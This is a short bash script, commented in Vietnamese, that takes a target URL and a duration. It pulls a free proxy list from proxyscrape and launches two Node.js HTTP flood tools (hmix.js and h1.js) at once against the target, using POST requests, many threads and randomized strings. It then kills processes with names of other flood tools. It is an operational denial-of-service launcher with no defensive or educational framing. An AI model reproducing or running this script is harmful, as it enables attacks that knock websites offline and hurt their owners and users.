#!/bin/bash

# Usage: ./script.sh <URL> <TIME> 
[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1

URL=$1
TIME=$2

# Tải proxy loại HTTP + HTTPS vào live.txt
for type in http; do
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&country=all&protocol=$type&timeout=2000"
done > live.txt


export NODE_OPTIONS=--max-old-space-size=8192

node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 2 -r 48 --full true -d false &

node h1.js POST "$URL" live.txt "$TIME" 999 24 randomstring="true" &


wait
pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
